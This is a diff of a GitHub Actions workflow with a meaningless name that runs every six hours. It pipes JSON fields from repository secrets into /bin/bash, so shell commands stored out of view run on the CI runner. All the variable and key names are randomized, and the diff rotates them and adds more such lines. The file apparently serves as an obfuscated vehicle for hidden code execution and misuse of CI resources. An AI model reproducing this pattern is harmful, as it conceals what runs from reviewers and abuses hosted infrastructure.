@@ -3,22 +3,24 @@ name: evaporatepanicky
 on:
   workflow_dispatch:
   schedule:
-    - cron: '32 2/6 * * *'
-
+    - cron: '31 0/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: evaporatepanicky
         env:
-          lcvdr0593: ${{ secrets.lcvdr0593 }}
+          brt55957: ${{ secrets.brt55957 }}
         run: |
-          echo $lcvdr0593 | jq -r .w08 | /bin/bash
-          echo $aq8394 | jq -r .aup87073 | /bin/bash
-          echo $c934 | jq -r .vnuu18 | /bin/bash
-          echo $hjcb1408 | jq -r .atoig364 | /bin/bash
-          echo $j031 | jq -r .j2418 | /bin/bash
-          echo $ytdhm720 | jq -r .xqw629 | /bin/bash
+          echo $brt55957 | jq -r .ii986 | /bin/bash
+          echo $vk350 | jq -r .w884 | /bin/bash
+          echo $ptw50 | jq -r .vsc0 | /bin/bash
+          echo $x479 | jq -r .ac0816 | /bin/bash
+          echo $cihs07122 | jq -r .sl1662 | /bin/bash
+          echo $gahhs5 | jq -r .s087 | /bin/bash
+          echo $tncxw4 | jq -r .za36273 | /bin/bash
+          echo $sg57804 | jq -r .cn161 | /bin/bash
+          echo $ja51018 | jq -r .qyp099 | /bin/bash
+          echo $psoc94 | jq -r .mo4722 | /bin/bash
 
